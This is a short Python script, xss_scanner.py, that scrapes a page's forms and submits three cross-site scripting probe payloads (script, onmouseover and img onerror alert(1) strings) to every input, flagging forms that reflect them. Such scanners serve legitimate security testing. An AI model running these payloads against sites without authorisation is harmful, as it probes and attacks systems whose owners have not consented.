# xss_scanner.py
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import logging 


XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '" onmouseover="alert(1)',
    "'><img src=x onerror=alert(1)>"
]

def extract_forms(url):
    try:
        soup = BeautifulSoup(requests.get(url).text, 'html.parser')
        return soup.find_all('form')
    except:
        return []

def get_form_details(form):
    details = {}
    action = form.attrs.get('action')
    method = form.attrs.get('method', 'get').lower()
    inputs = []
    for tag in form.find_all('input'):
        name = tag.attrs.get('name')
        if not name:
            continue
        input_type = tag.attrs.get('type', 'text')
        inputs.append({'name': name, 'type': input_type})
    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details['action'])
    data = {input_field['name']: payload for input_field in form_details['inputs']}
    if form_details['method'] == 'post':
        return requests.post(target_url, data=data)
    return requests.get(target_url, params=data)

def scan_url_for_xss(url):
    logging.info(f"Started XSS scan on: {url}")
    forms = extract_forms(url)
    results = []

    for form in forms:
        form_details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if payload in response.text:
                logging.info(f"[VULNERABLE] Payload '{payload}' found on {url}")
                results.append({
                    'form': form_details,
                    'payload': payload,
                    'vulnerable': True,
                    'url': url
                })

    if not results:
        logging.info(f"No XSS vulnerabilities found on {url}")
    return results if results else [{"url": url, "vulnerable": False}]
